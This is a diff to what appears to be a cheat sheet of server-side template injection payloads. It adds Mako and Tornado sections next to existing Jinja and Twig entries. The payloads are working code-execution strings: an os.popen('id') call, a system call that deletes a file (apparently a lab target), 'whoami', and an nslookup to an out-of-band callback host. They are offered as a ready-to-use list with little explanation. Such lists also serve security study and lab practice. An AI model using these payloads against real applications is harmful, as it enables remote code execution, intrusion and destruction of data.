@@ -19,6 +19,18 @@ I.e: Sending this ipout ${7*7}, if the answer is this 7777777 is a Jinja Templat
 {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
 ```
 
+## Mako Exploit (python)
+```bash
+<% print 7*7 %>
+<%25+system("rm+/home/carlos/morale.txt")%25> 
+```
+
+## Tornado Exploit (python)
+```
+{{os.system('whoami')}}
+{%import os%}{{os.system('nslookup oastify.com')}}
+```
+
 ## Twigo Exploit (php)
 ```bash
 {{ _self }}
